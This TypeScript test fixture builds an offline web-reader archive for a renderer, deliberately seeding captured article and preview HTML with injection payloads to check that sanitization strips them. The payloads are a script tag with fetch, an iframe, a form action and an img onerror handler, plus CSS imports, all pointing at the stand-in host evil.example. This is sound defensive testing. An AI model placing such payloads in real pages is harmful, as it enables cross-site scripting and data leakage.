import { readFile, mkdir, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { dirname, join } from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import type { WebCaptureManifest, WebReaderAsset } from '@pagelingo/document-contracts';
import { sanitizeNodeSnapshot, buildSnapshotPreviews, canonicalManifestBytes, projectWebReader } from '@pagelingo/web-capture/node';
import * as renderer from '../src/index.js';
import { webSnapshot } from './web-fixtures.js';
export const digest = (bytes: string | Uint8Array) => createHash('sha256').update(bytes).digest('hex');
export async function offlineFixture(count = 400, partial = true) {
  const image = await readFile(new URL('../../web-capture/tests/fixtures/chromium-7x5.jpg', import.meta.url));
  const scope = { kind: 'article' as const, rootNodeId: 'article', completeWithinScope: false, warnings: ['Only the captured article; comments unavailable'] };
  const html = '<article><h1>Offline article</h1><p>Original English paragraph.</p><p>&lt;/script&gt;&lt;script&gt;window.pwned=1&lt;/script&gt;</p><pre>const code = "&lt;script&gt;";</pre><p>$$x^2$$</p><math><mi>y</mi></math><svg viewBox="0 0 10 10"><path d="M0 0 L10 10"></path></svg>' + ['__proto__', 'constructor', 'toString', 'broken'].map(id => `<img src="https://example.com/${id}.jpg" alt="${id}">`).join('') + '<img src="https://example.com/missing.png" alt="missing"><table><thead><tr><th>Column header</th></tr></thead><tbody>' + Array.from({ length: Math.min(count, 260) }, (_, i) => `<tr><td>Row ${i}</td></tr>`).join('') + '</tbody></table>' + Array.from({ length: Math.max(0, count - 260) }, (_, i) => `<p>Paragraph ${i}</p>`).join('') + '</article>';
  const snapshot = sanitizeNodeSnapshot({ html, url: 'https://example.com/article', scope });
  const files = new Map<string, Uint8Array>(); files.set('source/source.html', Buffer.from(snapshot.html));
  const capture: WebCaptureManifest = { schemaVersion: 'web-capture/1', captureId: '11111111-1111-4111-8111-111111111111', source: { url: snapshot.sourceUrl, canonicalUrl: null, kind: 'article', method: 'extension' }, metadata: { title: 'Offline </script> article', author: null, publishedAt: null, capturedAt: '2026-10-28T00:00:00.000Z' }, scope: snapshot.scope, htmlFileId: 'html', files: [{ id: 'html', path: 'source.html', role: 'html', mediaType: 'text/html', bytes: Buffer.byteLength(snapshot.html), sha256: digest(snapshot.html) }], resources: [], stylesheetFileIds: [], snapshots: { previews: [], nodeLocations: {} }, existingTranslation: null };
  const assets: WebReaderAsset[] = [];
  for (const resource of snapshot.resources) {
    if (resource.role !== 'image') throw Error('Expected image fixture');
    const id = resource.url!.split('/').at(-1)!.replace('.jpg', '');
    if (id === 'missing.png') { capture.resources.push({ ...resource, role: 'image', status: 'missing', reason: 'unavailable' }); continue; }
    const bytes = id === 'broken' ? Buffer.from('invalid image data') : image;
    const descriptor = { id, path: `images/${id} #.jpg`, bytes: bytes.length, sha256: digest(bytes), mediaType: 'image/jpeg' as const };
    capture.files.push({ ...descriptor, role: 'image' }); capture.resources.push({ ...resource, role: 'image', status: 'available', fileId: id });
    assets.push({ ...descriptor, width: 7, height: 5, frames: 1 }); files.set(`source/${descriptor.path}`, bytes);
  }
  const css = '@import "https://evil.example/css"; body{background:url(https://evil.example/bg)}';
  capture.files.push({ id: 'css', path: 'original.css', role: 'css', mediaType: 'text/css', bytes: Buffer.byteLength(css), sha256: digest(css) });
  capture.resources.push({ id: 'css', role: 'css', url: 'https://example.com/original.css', status: 'available', fileId: 'css' }); capture.stylesheetFileIds.push('css'); files.set('source/original.css', Buffer.from(css));
  const built = await buildSnapshotPreviews(snapshot, capture);
  // Prove archived markup is sanitized again, even if it contains active payloads.
  const previews = built.files.map(file => {
    const html = file.html + '<script>window.pwned=1;fetch("https://evil.example/script")</script><style>body{background:url(https://evil.example/preview)}</style><iframe src="https://evil.example/frame"></iframe><form action="https://evil.example/form"><input></form><img src="https://evil.example/image" onerror="window.pwned=1">';
    file.descriptor.bytes = Buffer.byteLength(html); file.descriptor.sha256 = digest(html);
    const entry = built.index.previews.find(p => p.fileId === file.descriptor.id)!; entry.htmlBytes = file.descriptor.bytes;
    capture.files.push(file.descriptor); files.set(`source/${file.descriptor.path}`, Buffer.from(html));
    return { fileId: file.descriptor.id, html };
  });
  capture.snapshots = built.index;
  const ir = await projectWebReader(snapshot, capture, { manifestBytes: canonicalManifestBytes(capture), assets });
  const translation = partial ? webSnapshot(ir, true) : null;
  if (translation) { const entry = translation.blocks[0]; translation.blocks[0] = { blockId: entry.blockId, status: 'source-only', reason: 'pending' }; translation.units.filter(unit => unit.blockId === entry.blockId).forEach(unit => { unit.status = 'pending'; }); translation.status = 'partial'; const paragraph = ir.blocks.find(b => b.type === 'text' && b.value.content.some(i => i.type === 'text' && i.text === 'Original English paragraph.')); const proof = translation.blocks.find(b => b.blockId === paragraph?.id); if (proof?.status === 'translated') proof.rawText = '译文段落。'; }
  const build = renderer.buildWebReader(ir, translation);
  return { input: { ir, translation, ...build, capture, assets: assets.map(({ id, path, mediaType, bytes, sha256 }) => ({ id, path: `source/${path}`, mediaType, bytes, sha256 })), previews, previewImages: assets.map(asset => ({ fileId: asset.id, data: files.get(`source/${asset.path}`)! })) }, files };
}
export async function writeOfflineFixture(root: string, count = 400, partial = true, options: { omitPreviews?: boolean } = {}) {
  const fixture = await offlineFixture(count, partial);
  if (typeof renderer.createWebStaticFilePlan !== 'function') throw Error('Web offline file plan is missing');
  const plan = renderer.createWebStaticFilePlan(options.omitPreviews ? { ...fixture.input, previews: undefined, previewImages: undefined } : fixture.input);
  const require = createRequire(import.meta.url);
  for (const asset of plan.trustedAssets) {
    const base = asset.source.package === 'katex' ? dirname(require.resolve('katex/package.json')) : fileURLToPath(new URL('../', import.meta.url));
    const bytes = await readFile(join(base, asset.source.path));
    if (bytes.length !== asset.bytes || digest(bytes) !== asset.sha256) throw Error('Trusted asset digest mismatch');
    fixture.files.set(asset.path, bytes);
  }
  for (const file of plan.generatedFiles) fixture.files.set(file.path, Buffer.from(file.content));
  for (const [path, bytes] of fixture.files) { await mkdir(dirname(join(root, path)), { recursive: true }); await writeFile(join(root, path), bytes); }
  return fixture.input;
}
